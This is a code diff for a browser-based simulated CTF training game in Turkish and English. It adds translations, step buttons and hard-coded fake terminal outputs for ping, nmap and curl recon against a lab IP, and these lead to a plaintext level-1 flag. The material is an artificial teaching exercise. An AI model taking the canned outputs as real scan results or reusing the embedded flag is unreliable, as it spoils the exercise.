+        if (count >= 1) return isEn ? '🌐 Network Recon Scout' : '🌐 Ağ Kaşifi';
+        return isEn ? '🔰 Cadet Analyst' : '🔰 Çaylak Analist';
     }
 
     function renderCtfProgress() {
         const completedCount = ctfState.completed.length;
         const total = CTF_MISSIONS.length;
         const pct = Math.round((completedCount / total) * 100);
+        const isEn = (window.I18N && I18N.currentLang === 'en');
+        const rankStr = getCtfRank(completedCount, ctfState.xp);
 
         const textEl = document.getElementById('ctf-progress-text');
-        if (textEl) textEl.textContent = `İlerleme: ${completedCount}/${total} Görev Tamamlandı (%${pct})`;
+        if (textEl) {
+            textEl.textContent = isEn
+                ? `Progress: ${completedCount}/${total} Missions Completed (${pct}%)`
+                : `İlerleme: ${completedCount}/${total} Görev Tamamlandı (%${pct})`;
+        }
 
         const xpEl = document.getElementById('ctf-total-xp');
-        if (xpEl) xpEl.textContent = `TOPLAM XP: ${ctfState.xp}`;
+        if (xpEl) xpEl.textContent = isEn ? `TOTAL XP: ${ctfState.xp}` : `TOPLAM XP: ${ctfState.xp}`;
 
         const rankEl = document.getElementById('ctf-current-rank');
-        if (rankEl) rankEl.textContent = `Rütbe: ${getCtfRank(completedCount, ctfState.xp)}`;
+        if (rankEl) rankEl.textContent = isEn ? `Rank: ${rankStr}` : `Rütbe: ${rankStr}`;
 
         const fillEl = document.getElementById('ctf-progress-bar-fill');
         if (fillEl) fillEl.style.width = `${pct}%`;
+
+        // Update Live HUD Cards
+        const m = CTF_MISSIONS[ctfState.activeIdx] || CTF_MISSIONS[0];
+        const hudTarget = document.getElementById('ctf-hud-target');
+        if (hudTarget && m) hudTarget.textContent = (isEn && m.target_en) ? m.target_en : m.target;
+
+        const hudSolved = document.getElementById('ctf-hud-solved');
+        if (hudSolved) {
+            hudSolved.textContent = isEn
+                ? `${completedCount} / ${total} Completed (${pct}%)`
+                : `${completedCount} / ${total} Tamamlandı (%${pct})`;
+        }
+
+        const hudRank = document.getElementById('ctf-hud-rank-short');
+        if (hudRank) hudRank.textContent = rankStr;
     }
 
     function renderCtfStageTabs() {
         const nav = document.getElementById('ctf-stage-nav');
         if (!nav) return;
+        const isEn = (window.I18N && I18N.currentLang === 'en');
 
         nav.innerHTML = CTF_MISSIONS.map((m, idx) => {
+            if (ctfState.activeFilter !== 'all' && m.group !== ctfState.activeFilter) {
+                return '';
+            }
             const isCompleted = ctfState.completed.includes(m.id);
-            const isUnlocked = idx <= ctfState.unlockedIdx;
+            const isUnlocked = idx <= ctfState.unlockedIdx || isCompleted;
             const isActive = idx === ctfState.activeIdx;
 
             let statusIcon = '🔒';
             let statusClass = 'locked';
-            let statusText = 'Kilitli';
+            let statusText = isEn ? 'Locked' : 'Kilitli';
 
             if (isCompleted) {
                 statusIcon = '✔';
                 statusClass = 'completed';
-                statusText = 'Bitti';
+                statusText = isEn ? 'Solved' : 'Bitti';
             } else if (isUnlocked) {
                 statusIcon = '⚡';
                 statusClass = 'unlocked';
-                statusText = 'Açık';
+                statusText = isEn ? 'Open' : 'Açık';
             }
 
             if (isActive) statusClass += ' active';
 
-            // Clean short title for stepper button
-            const shortTitle = m.title.replace('Operasyon ', '').split('(')[0].trim();
+            const rawTitle = (isEn && m.title_en) ? m.title_en : m.title;
+            const shortTitle = rawTitle.replace('Operasyon ', '').replace('Operation ', '').split('(')[0].trim();
 
             return `
                 <div class="ctf-stepper-item ${statusClass}" data-stage-idx="${idx}">
                     <div class="ctf-stepper-top-row">
-                        <span style="color: ${m.badgeColor};">SEVİYE ${m.level}</span>
-                        <span>${statusIcon} ${statusText}</span>
+                        <span style="color: ${m.badgeColor};">${isEn ? 'LVL' : 'SEVİYE'} ${m.level}</span>
+                        <span>${statusIcon} ${statusText} <strong style="color:#10b981;margin-left:2px;">+${m.xp}</strong></span>
                     </div>
-                    <div class="ctf-stepper-title" title="${escapeHtml(m.title)}">${escapeHtml(shortTitle)}</div>
+                    <div class="ctf-stepper-title" title="${escapeHtml(rawTitle)}">${escapeHtml(shortTitle)}</div>
                 </div>
             `;
         }).join('');
@@ -4734,16 +5964,44 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
         nav.querySelectorAll('.ctf-stepper-item').forEach(item => {
             item.addEventListener('click', () => {
                 const idx = parseInt(item.dataset.stageIdx, 10);
-                if (idx <= ctfState.unlockedIdx) {
+                const isComp = ctfState.completed.includes(CTF_MISSIONS[idx].id);
+                if (idx <= ctfState.unlockedIdx || isComp) {
                     ctfState.activeIdx = idx;
                     saveCtfProgressToStorage();
+                    renderCtfProgress();
                     renderCtfStageTabs();
                     renderCtfBriefing(idx);
                     updateCtfTerminalTarget();
                 } else {
-                    showToast('error', 'Kilitli Seviye', `Bu seviyeyi açmak için önce Seviye ${CTF_MISSIONS[idx - 1].level} operasyonunu tamamlamalısınız.`);
+                    const prevLvl = CTF_MISSIONS[idx - 1] ? CTF_MISSIONS[idx - 1].level : '1.1';
+                    showToast(
+                        'error',
+                        isEn ? 'Locked Level' : 'Kilitli Seviye',
+                        isEn ? `Complete Level ${prevLvl} first to unlock this operation.` : `Bu seviyeyi açmak için önce Seviye ${prevLvl} operasyonunu tamamlamalısınız.`
+                    );
                 }
             });
+        });
+    }
+
+    function markMissionStepDone(missionId, stepIndex) {
+        if (!ctfState.completedSteps[missionId]) {
+            ctfState.completedSteps[missionId] = [];
+        }
+        if (!ctfState.completedSteps[missionId].includes(stepIndex)) {
+            ctfState.completedSteps[missionId].push(stepIndex);
+            saveCtfProgressToStorage();
+            renderCtfBriefing(ctfState.activeIdx);
+        }
+    }
+
+    function checkAndMarkStepForCommand(m, lowerCmd) {
+        if (!m || !Array.isArray(m.steps)) return;
+        m.steps.forEach((step, sIdx) => {
+            const allMatch = (step.match || []).every(keyword => lowerCmd.includes(keyword.toLowerCase()));
+            if (allMatch) {
+                markMissionStepDone(m.id, sIdx);
+            }
         });
     }
 
@@ -4751,65 +6009,104 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
         const box = document.getElementById('ctf-briefing-box');
         if (!box) return;
 
-        const m = CTF_MISSIONS[idx];
+        const m = CTF_MISSIONS[idx] || CTF_MISSIONS[0];
         const isCompleted = ctfState.completed.includes(m.id);
+        const isEn = (window.I18N && I18N.currentLang === 'en');
+        const doneArr = ctfState.completedSteps[m.id] || [];
+
+        const titleTxt = (isEn && m.title_en) ? m.title_en : m.title;
+        const levelLbl = (isEn && m.levelLabel_en) ? m.levelLabel_en : m.levelLabel;
+        const catTxt = (isEn && m.category_en) ? m.category_en : m.category;
+        const targetTxt = (isEn && m.target_en) ? m.target_en : m.target;
+        const storyHtml = (isEn && m.story_en) ? m.story_en : m.story;
+
+        const stepsHtml = (m.steps || []).map((st, sIdx) => {
+            const isStepDone = isCompleted || doneArr.includes(sIdx);
+            const stTitle = (isEn && st.label_en) ? st.label_en : st.label;
+            return `
+                <div class="ctf-step-row ${isStepDone ? 'done' : ''}">
+                    <span class="ctf-step-check">${isStepDone ? '✔' : (sIdx + 1)}</span>
+                    <div class="ctf-step-info">
+                        <div class="ctf-step-title">${escapeHtml(stTitle)}</div>
+                        <span class="ctf-step-cmd">$ ${escapeHtml(st.cmd)}</span>
+                    </div>
+                    <button type="button" class="ctf-step-run-btn" data-run-ctf-cmd="${escapeHtml(st.cmd)}" title="${isEn ? 'Execute in CTF Terminal' : 'CTF Terminalinde Çalıştır'}">
+                        ⚡ ${isEn ? 'Run' : 'Çalıştır'}
+                    </button>
+                </div>
+            `;
+        }).join('');
+
+        const doneCount = isCompleted ? (m.steps || []).length : doneArr.length;
+        const totalSteps = (m.steps || []).length;
 
         box.innerHTML = `
             <div class="ctf-card-top">
                 <div class="ctf-card-badges">
-                    <span class="ctf-mini-pill" style="background: rgba(${hexToRgb(m.badgeColor)}, 0.15); color: ${m.badgeColor}; border: 1px solid ${m.badgeColor};">${escapeHtml(m.levelLabel)}</span>
-                    <span class="ctf-mini-pill" style="background: rgba(255, 255, 255, 0.05); color: #cbd5e1; border: 1px solid rgba(255, 255, 255, 0.1);">${escapeHtml(m.category)}</span>
+                    <span class="ctf-mini-pill" style="background: rgba(${hexToRgb(m.badgeColor)}, 0.15); color: ${m.badgeColor}; border: 1px solid ${m.badgeColor};">${escapeHtml(levelLbl)}</span>
+                    <span class="ctf-mini-pill" style="background: rgba(255, 255, 255, 0.05); color: #cbd5e1; border: 1px solid rgba(255, 255, 255, 0.1);">${escapeHtml(catTxt)}</span>
                     <span class="ctf-mini-pill" style="background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid #10b981;">+${m.xp} XP</span>
                 </div>
                 <div class="ctf-target-label">
                     <span class="pulsing-beacon" style="width: 5px; height: 5px; background: var(--cyan); display: inline-block; vertical-align: middle; margin-right: 4px;"></span>
-                    <span>🎯 ${escapeHtml(m.target)}</span>
+                    <span>🎯 ${escapeHtml(targetTxt)}</span>
                 </div>
             </div>
 
-            <h2 class="ctf-mission-heading">${escapeHtml(m.title)}</h2>
+            <h2 class="ctf-mission-heading">${escapeHtml(titleTxt)}</h2>
 
-            <!-- Pure Story Narrative & Directive -->
+            <!-- Story Narrative -->
             <div class="ctf-brief-box">
-                ${m.story}
+                ${storyHtml}
             </div>
 
-            <!-- Tactical Hint Accordion: Commands are displayed only here for manual typing -->
+            <!-- Interactive Step-by-Step Mission Chain -->
+            <div class="ctf-steps-box">
+                <div class="ctf-steps-header">
+                    <span>🎯 ${isEn ? 'STEP-BY-STEP ATTACK / DEFENSE CHAIN' : 'ADIM ADIM OPERASYON GÖREV ZİNCİRİ'}</span>
+                    <span style="color: ${doneCount === totalSteps ? '#10b981' : '#94a3b8'};">${doneCount}/${totalSteps} ${isEn ? 'Steps' : 'Adım'}</span>
+                </div>
+                ${stepsHtml}
+            </div>
+
+            <!-- Tactical Hint Accordion -->
             <div class="ctf-hint-container" id="ctf-hint-accordion">
                 <button type="button" class="ctf-hint-btn" id="btn-toggle-ctf-hint">
-                    <span style="display: flex; align-items: center; gap: 6px;">💡 Taktik İpucu &amp; Önerilen Kodlar (Takılırsan Tıkla)</span>
+                    <span style="display: flex; align-items: center; gap: 6px;">💡 ${isEn ? 'Tactical Hint & Command Reference' : 'Taktik İpucu & Önerilen Kodlar (Takılırsan Tıkla)'}</span>
                     <span id="ctf-hint-icon">&darr;</span>
                 </button>
                 <div class="ctf-hint-body" id="ctf-hint-text-area">
                     <div style="margin-bottom: 10px; line-height: 1.55;">${m.hint}</div>
-                    <div style="font-family: var(--font-mono); font-weight: 700; color: var(--cyan); margin-bottom: 6px; font-size: 11px;">
-                        KULLANILABİLİR KOMUTLAR (Öğrenmek için terminale kendi elinle yaz):
-                    </div>
-                    <div style="display: flex; flex-direction: column; gap: 5px;">
-                        ${m.quickCmds.map(c => `
-                            <div style="font-family: var(--font-mono); background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(0, 229, 255, 0.2); padding: 6px 10px; border-radius: 4px; color: #a7f3d0; font-size: 11.5px; user-select: text;">
-                                <span style="color: var(--cyan); font-weight: 700;">$</span> ${escapeHtml(c)}
-                            </div>
-                        `).join('')}
-                    </div>
                 </div>
             </div>
 
             <!-- Flag Submission -->
             <div class="ctf-flag-container">
                 <div style="display: flex; justify-content: space-between; align-items: center;">
-                    <span style="font-size: 11px; font-family: var(--font-mono); font-weight: 700; color: #cbd5e1;">BAYRAK TESLİM ALANI:</span>
-                    ${isCompleted ? '<span style="color: #10b981; font-weight: 700; font-size: 10.5px; font-family: var(--font-mono);">✔ ÇÖZÜLDÜ</span>' : ''}
+                    <span style="font-size: 11px; font-family: var(--font-mono); font-weight: 700; color: #cbd5e1;">${isEn ? 'FLAG SUBMISSION VAULT:' : 'BAYRAK TESLİM ALANI:'}</span>
+                    ${isCompleted ? `<span style="color: #10b981; font-weight: 700; font-size: 10.5px; font-family: var(--font-mono);">✔ ${isEn ? 'SOLVED' : 'ÇÖZÜLDÜ'}</span>` : ''}
                 </div>
                 <div class="ctf-flag-row">
-                    <input type="text" class="ctf-input-field" id="ctf-flag-input-field" placeholder="Örn: LFL{...}" value="${isCompleted ? m.flag : ''}" ${isCompleted ? 'readonly' : ''} autocomplete="off" spellcheck="false" />
+                    <input type="text" class="ctf-input-field" id="ctf-flag-input-field" placeholder="LFL{...}" value="${isCompleted ? m.flag : ''}" ${isCompleted ? 'readonly' : ''} autocomplete="off" spellcheck="false" />
                     <button type="button" class="ctf-btn-verify" id="btn-submit-ctf-flag">
-                        <span>🚩 Doğrula</span>
+                        <span>🚩 ${isEn ? 'Verify' : 'Doğrula'}</span>
                     </button>
                 </div>
                 <div class="ctf-alert-box" id="ctf-feedback-msg-box"></div>
             </div>
         `;
+
+        // Bind quick-run step buttons
+        box.querySelectorAll('[data-run-ctf-cmd]').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const cmdToRun = btn.getAttribute('data-run-ctf-cmd');
+                if (cmdToRun) {
+                    ctfState.history.push(cmdToRun);
+                    ctfState.historyIdx = ctfState.history.length;
+                    executeCtfCommand(cmdToRun);
+                }
+            });
+        });
 
         // Hint toggle listener
         const hintBox = document.getElementById('ctf-hint-accordion');
@@ -4848,6 +6145,7 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
         const flag = (rawFlag || '').trim();
         const m = CTF_MISSIONS[ctfState.activeIdx];
         const feedback = document.getElementById('ctf-feedback-msg-box');
+        const inputEl = document.getElementById('ctf-flag-input-field');
 
         if (!flag) {
             if (feedback) {
@@ -4858,11 +6156,14 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
         }
 
         if (flag === m.flag) {
-
+            if (inputEl) inputEl.value = m.flag;
 
             if (!ctfState.completed.includes(m.id)) {
                 ctfState.completed.push(m.id);
                 ctfState.xp += m.xp;
+
+                // Mark all steps done for this mission
+                ctfState.completedSteps[m.id] = (m.steps || []).map((_, idx) => idx);
 
                 // Unlock next stage
                 if (ctfState.activeIdx + 1 > ctfState.unlockedIdx && ctfState.activeIdx + 1 < CTF_MISSIONS.length) {
@@ -4876,17 +6177,17 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
                 feedback.innerHTML = `<strong>✔ TEBRİKLER!</strong> ${escapeHtml(m.successMsg)} <span style="color: #10b981; font-weight: 700;">(+${m.xp} XP)</span>`;
             }
 
-            showToast('success', 'Bayrak Yakalandı!', `Tebrikler! ${m.title} başarıyla tamamlandı. (+${m.xp} XP)`);
+            showToast('success', '🚩 Bayrak Yakalandı!', `Tebrikler! ${m.title} başarıyla tamamlandı. (+${m.xp} XP)`);
 
-            // Check if all 6 completed
             if (ctfState.completed.length >= CTF_MISSIONS.length) {
                 setTimeout(() => {
-                    showToast('success', '🏆 CTF Tamamlandı!', 'Tebrikler! 6 kademeli operasyonun tamamını başarıyla bitirdiniz.');
+                    showToast('success', '👑 EFSANEVİ CTF ŞAMPİYONU!', 'Tebrikler! 10 kademeli siber operasyonun tamamını bitirerek 6000 XP topladınız!');
                 }, 500);
             }
 
             renderCtfProgress();
             renderCtfStageTabs();
+            renderCtfBriefing(ctfState.activeIdx);
 
             // Print in CTF terminal
             printCtfOutput(`\n<span style="color: #10b981; font-weight: 700;">[+] ==============================================================</span>\n<span style="color: #10b981; font-weight: 800;">[+] FLAG CAPTURED: ${escapeHtml(m.flag)}</span>\n<span style="color: #10b981; font-weight: 700;">[+] TEBRİKLER! Seviye ${m.level} başarıyla tamamlandı! (+${m.xp} XP)</span>\n<span style="color: #10b981; font-weight: 700;">[+] ==============================================================</span>\n`);
@@ -4895,47 +6196,43 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
             if (ctfState.activeIdx < CTF_MISSIONS.length - 1) {
                 setTimeout(() => {
                     ctfState.activeIdx++;
+                    renderCtfProgress();
                     renderCtfStageTabs();
                     renderCtfBriefing(ctfState.activeIdx);
                     updateCtfTerminalTarget();
-                }, 1600);
+                }, 1700);
             }
         } else {
-
             if (feedback) {
                 feedback.className = 'ctf-feedback-msg error';
-                feedback.innerHTML = '❌ Hatalı bayrak! Lütfen terminaldeki çıktıları ve ipucunu dikkatlice inceleyerek tekrar deneyin.';
+                feedback.innerHTML = '❌ Hatalı bayrak! Lütfen görev adımlarını ve terminal çıktılarını inceleyerek tekrar deneyin.';
             }
-            showToast('error', 'Hatalı Bayrak', 'Girdiğiniz bayrak bu görevle eşleşmedi. İpuçlarını kontrol edin.');
+            showToast('error', 'Hatalı Bayrak', 'Girdiğiniz bayrak bu görevle eşleşmedi.');
         }
     }
+    window.submitCtfFlag = submitCtfFlag;
 
     function updateCtfTerminalTarget() {
-        const m = CTF_MISSIONS[ctfState.activeIdx];
+        const m = CTF_MISSIONS[ctfState.activeIdx] || CTF_MISSIONS[0];
         ctfState.sshSessionActive = false;
 
-        // 1. Her yeni seviyede terminali tamamen temizle
         clearCtfTerminal();
 
-        // 2. Prompt etiketini varsayılana getir
         const promptEl = document.getElementById('ctf-term-prompt-label');
         if (promptEl) promptEl.textContent = 'root@kali-ctf:~#';
 
-        // 3. Başlık çubuğundaki hedef bilgisini güncelle
         const badgeText = document.getElementById('ctf-term-title-text');
         if (badgeText) {
             badgeText.textContent = `root@kali-ctf:~# [${m.target}]`;
         }
 
-        // 4. Yeni seviye için tertemiz ve net karşılama mesajı bas
         printCtfOutput(`
 <span style="color: #00e5ff; font-weight: 800;">┌──(root㉿kali-ctf)-[~]</span>
-<span style="color: #94a3b8;">│ LFL CTF OPERASYONU // SEVİYE ${m.level}: ${escapeHtml(m.title)}</span>
+<span style="color: #94a3b8;">│ LFL CTF OPERASYONU // SEVİYE ${m.level}: ${escapeHtml(m.title)} (+${m.xp} XP)</span>
 <span style="color: #94a3b8;">│ Hedef Sistem: ${escapeHtml(m.target)}</span>
-<span style="color: #00e5ff; font-weight: 800;">└─#</span> <span style="color: #10b981;">Terminal temizlendi ve hazırlandı. Komutları aşağıya yazıp Enter'a basın.</span>
+<span style="color: #00e5ff; font-weight: 800;">└─#</span> <span style="color: #10b981;">Terminal hazır. Soldaki adımlardan ⚡ Çalıştır'a tıklayın veya komutları aşağıya yazın.</span>
         `);
 
-        // 5. Giriş alanını temizle ve odakla
         const input = document.getElementById('ctf-term-command-input');
         if (input) {
             input.value = '';
@@ -4943,11 +6240,24 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
         }
     }
 
+    function renderAutoClaimFlagBtn(flagStr) {
+        return `<div style="margin-top: 6px;"><button type="button" class="ctf-auto-claim-btn" data-auto-claim-flag="${escapeHtml(flagStr)}">🚩 Bayrağı Otomatik Teslim Et (${escapeHtml(flagStr)})</button></div>`;
+    }
+
     function printCtfOutput(html) {
         const out = document.getElementById('ctf-term-output-area');
         if (!out) return;
         const div = document.createElement('div');
         div.innerHTML = html;
+
+        // Bind any auto-claim flag button inside output
+        div.querySelectorAll('[data-auto-claim-flag]').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const f = btn.getAttribute('data-auto-claim-flag');
+                if (f) submitCtfFlag(f);
+            });
+        });
+
         out.appendChild(div);
 
         const screen = document.getElementById('ctf-term-screen');
@@ -4961,13 +6271,13 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
 
     function resetCtfTerminal() {
         clearCtfTerminal();
-        const m = CTF_MISSIONS[ctfState.activeIdx];
+        const m = CTF_MISSIONS[ctfState.activeIdx] || CTF_MISSIONS[0];
         printCtfOutput(`
 <span style="color: #00e5ff; font-weight: 800;">┌──(root㉿kali-ctf)-[~]</span>
-<span style="color: #94a3b8;">│ LFL SİBER CTF OPERASYON LABORATUVARI // KADEME: SEVİYE ${m.level}</span>
+<span style="color: #94a3b8;">│ LFL SİBER CTF OPERASYON LABORATUVARI // KADEME: SEVİYE ${m.level} (+${m.xp} XP)</span>
 <span style="color: #94a3b8;">│ Hedef Sistem: ${escapeHtml(m.target)}</span>
-<span style="color: #94a3b8;">│ Sadece kütüphanedeki 142 Kali Linux kodu kullanılabilir.</span>
-<span style="color: #00e5ff; font-weight: 800;">└─#</span> <span style="color: #10b981;">Simülasyon hazır. Başlamak için soldaki komutlara tıklayın veya doğrudan yazın.</span>
+<span style="color: #94a3b8;">│ Sitedeki 143+ Kali Linux aracı ve 10 CTF senaryosu aktif.</span>
+<span style="color: #00e5ff; font-weight: 800;">└─#</span> <span style="color: #10b981;">Simülasyon hazır. Soldaki görev adımlarından ⚡ Çalıştır'a basın veya doğrudan yazın.</span>
         `);
     }
 
@@ -4977,9 +6287,24 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
         const input = document.getElementById('ctf-term-command-input');
         const btnClear = document.getElementById('btn-clear-ctf-term');
         const btnReset = document.getElementById('btn-reset-ctf-term');
+        const btnNextStep = document.getElementById('btn-ctf-run-next-step');
 
         if (btnClear) btnClear.addEventListener('click', clearCtfTerminal);
         if (btnReset) btnReset.addEventListener('click', resetCtfTerminal);
+
+        if (btnNextStep) {
+            btnNextStep.addEventListener('click', () => {
+                const m = CTF_MISSIONS[ctfState.activeIdx];
+                if (!m || !Array.isArray(m.steps)) return;
+                const doneArr = ctfState.completedSteps[m.id] || [];
+                const nextStep = m.steps.find((_, idx) => !doneArr.includes(idx)) || m.steps[0];
+                if (nextStep && nextStep.cmd) {
+                    ctfState.history.push(nextStep.cmd);
+                    ctfState.historyIdx = ctfState.history.length;
+                    executeCtfCommand(nextStep.cmd);
+                }
+            });
+        }
 
         let ctfTabCursor = -1;
         let lastCtfPrefix = null;
@@ -4998,7 +6323,6 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
 
                     executeCtfCommand(cmd);
                 } else if (e.key === 'Tab') {
-                    // TAB KEY AUTO-COMPLETION (Oto Tamamlama)
                     e.preventDefault();
                     const m = CTF_MISSIONS[ctfState.activeIdx];
                     const missionCmds = (m && m.quickCmds) ? m.quickCmds : [];
@@ -5011,19 +6335,14 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
                     let matches = [];
 
                     if (!currentVal) {
-                        // Empty line: cycle through current mission's recommended commands!
                         matches = missionCmds.length > 0 ? missionCmds : pool.slice(0, 8);
                     } else {
-                        // Priority 1: Mission commands that start with currentVal
                         const mPrefix = missionCmds.filter(c => c.toLowerCase().startsWith(currentLower));
-                        // Priority 2: All 142 Kali commands that start with currentVal
                         const allPrefix = pool.filter(c => c.toLowerCase().startsWith(currentLower));
-                        // Priority 3: Substring matches
                         const allSubstr = pool.filter(c => !c.toLowerCase().startsWith(currentLower) && c.toLowerCase().includes(currentLower));
 
                         matches = Array.from(new Set([...mPrefix, ...allPrefix, ...allSubstr]));
 
-                        // If user typed "sub" or "lfl", offer submitting flag directly
                         if (currentLower.startsWith('sub') || currentLower.startsWith('lfl')) {
                             if (m && m.flag) {
                                 matches.unshift(`submit ${m.flag}`);
@@ -5068,11 +6387,14 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
     function executeCtfCommand(rawCmd) {
         const cmd = rawCmd.trim();
         const lower = cmd.toLowerCase();
-        const m = CTF_MISSIONS[ctfState.activeIdx];
+        const m = CTF_MISSIONS[ctfState.activeIdx] || CTF_MISSIONS[0];
         const promptLabel = ctfState.sshSessionActive ? 'operator@fortress:~$' : 'root@kali-ctf:~#';
 
         // Echo prompt & command
         printCtfOutput(`<div style="margin-top: 6px;"><span style="color: #00e5ff; font-weight: 700;">${promptLabel}</span> <span style="color: #ffffff;">${escapeHtml(cmd)}</span></div>`);
+
+        // Check if command completes any step in current mission
+        checkAndMarkStepForCommand(m, lower);
 
         // Check clear
         if (lower === 'clear' || lower === 'cls') {
@@ -5082,7 +6404,7 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
 
         // Direct flag submission via terminal
         if (lower.startsWith('submit ') || lower.startsWith('lfl{')) {
-            const flagCandidate = cmd.startsWith('submit ') ? cmd.substring(7).trim() : cmd;
+            const flagCandidate = cmd.toLowerCase().startsWith('submit ') ? cmd.substring(7).trim() : cmd;
             submitCtfFlag(flagCandidate);
             return;
         }
@@ -5097,9 +6419,9 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
 [★] LFL CYBER CTF // ROOT MASTER CONSOLE (burak_wyxz)
 [★] ==============================================================
 [+] Operatör          : burak_wyxz (Baş Yönetici)
-[+] CTF Puanı         : ${ctfState.xp} XP
+[+] CTF Puanı         : ${ctfState.xp} / 6000 XP
 [+] Tamamlanan Görev  : ${ctfState.completed.length} / ${CTF_MISSIONS.length}
-[+] İpucu             : '👑 Master Root Key' butonuna basarak tüm aşamaları anında açabilirsiniz.
+[+] İpucu             : '👑 Master Root Key' butonuna basarak 10 aşamayı anında açabilirsiniz.
 [★] ==============================================================
 </pre>`);
             } else {
@@ -5114,8 +6436,8 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
 <pre style="color: #38bdf8;">
 LFL CYBER CTF // YARDIM &amp; KULLANILABİLİR KOMUTLAR
 ===================================================================
-Bu operasyonda LFL Siber Kütüphanesi'ndeki 142 Kali aracı çalışır.
-Aktif Seviye (${m.level}) için önerilen komutlar:
+Bu operasyonda LFL Siber Kütüphanesi'ndeki 143+ Kali aracı çalışır.
+Aktif Seviye (${m.level}) için önerilen araçlar:
   ${m.tools.map(t => `<span style="color: #22c55e; font-weight: 700;">${t}</span>`).join(' &bull; ')}
 
 Hızlı Kullanım:
@@ -5159,58 +6481,40 @@ PING 10.10.1.5 (10.10.1.5) 56(84) bytes of data.
 
 --- 10.10.1.5 ping statistics ---
 3 packets transmitted, 3 received, <span style="color: #22c55e; font-weight: 700;">0% packet loss</span>, time 2004ms
-rtt min/avg/max/mdev = 1.120/1.180/1.240/0.048 ms
-<span style="color: #22c55e;">[+] HEDEF AKTİF! Sunucu ayakta. Şimdi nmap ile servisleri tarayın.</span>
-</pre>
-                `);
+<span style="color: #22c55e;">[+] ADIM 1 TAMAMLANDI: Hedef sunucu ayakta! Şimdi nmap -sV 10.10.1.5 ile servisleri tarayın.</span>
+</pre>`);
                 return;
             }
             if (lower.includes('nmap') && lower.includes('10.10.1.5')) {
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-08 02:00 UTC
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-10 01:00 UTC
 Nmap scan report for 10.10.1.5
-Host is up (0.0012s latency).
-Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
-<span style="color: #38bdf8; font-weight: 700;">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span>
+<span style="color: #38bdf8; font-weight: 700;">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6</span>
 <span style="color: #22c55e; font-weight: 700;">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span>
-|_http-server-header: Apache/2.4.52 (Ubuntu)
 |_http-title: LFL Internal Gateway Portal
-
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-<span style="color: #22c55e;">[+] Port 80 HTTP Servisi açık! curl -I http://10.10.1.5 ile başlıkları inceleyin.</span>
-</pre>
-                `);
+<span style="color: #22c55e;">[+] ADIM 2 TAMAMLANDI: Port 80 açık! curl -I http://10.10.1.5 ile HTTP başlıklarını inceleyin.</span>
+</pre>`);
                 return;
             }
             if (lower.includes('curl') && lower.includes('10.10.1.5')) {
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
 HTTP/1.1 200 OK
-Date: Sun, 08 Nov 2026 02:01:10 GMT
 Server: Apache/2.4.52 (Ubuntu)
-Last-Modified: Sat, 07 Nov 2026 21:10:00 GMT
-ETag: "29b-61019f88c7"
-Accept-Ranges: bytes
-Content-Length: 667
-Content-Type: text/html
 <span style="color: #f59e0b; font-weight: 800;">X-Secret-Auth: TEZMe2xldmVsMV8xX2FnX2tlc2lmX2Jhc2FyYW5zfQ==</span>
-Connection: close
-
-<span style="color: #22c55e;">[+] GİZLİ BAŞLIK BULUNDU: X-Secret-Auth: TEZMe2xldmVsMV8xX2FnX2tlc2lmX2Jhc2FyYW5zfQ==</span>
-<span style="color: #22c55e;">[+] Bu değeri echo "..." | base64 -d ile çözün!</span>
-</pre>
-                `);
+Content-Type: text/html
+<span style="color: #22c55e;">[+] ADIM 3 TAMAMLANDI: X-Secret-Auth başlığı bulundu! Base64 değerini çözün.</span>
+</pre>`);
                 return;
             }
             if (lower.includes('base64') && (lower.includes('tezme') || lower.includes('echo'))) {
                 printCtfOutput(`
-<pre style="color: #22c55e; font-weight: 700;">
-LFL{level1_1_ag_kesif_basarans}
+<pre style="color: #22c55e; font-weight: 800;">
+[★] DEŞİFRE EDİLEN BAYRAK: LFL{level1_1_ag_kesif_basarans}
 </pre>
-<span style="color: #00e5ff;">[+] Bayrak çözüldü! Sol taraftaki teslim kutusuna yapıştırıp doğrulayın veya 'submit LFL{...}' yazın.</span>
-                `);
+${renderAutoClaimFlagBtn('LFL{level1_1_ag_kesif_basarans}')}`);
                 return;
             }
         }
@@ -5223,15 +6527,12 @@ LFL{level1_1_ag_kesif_basarans}
                 printCtfOutput(`
 <pre style="color: #94a3b8;">
 total 16
-drwxr-xr-x 2 root root 4096 Nov  8 01:40 .
-drwxr-xr-x 14 root root 4096 Nov  8 01:20 ..
--rw-r--r-- 1 root root  512 Nov  8 01:42 backup_system.tar.gz
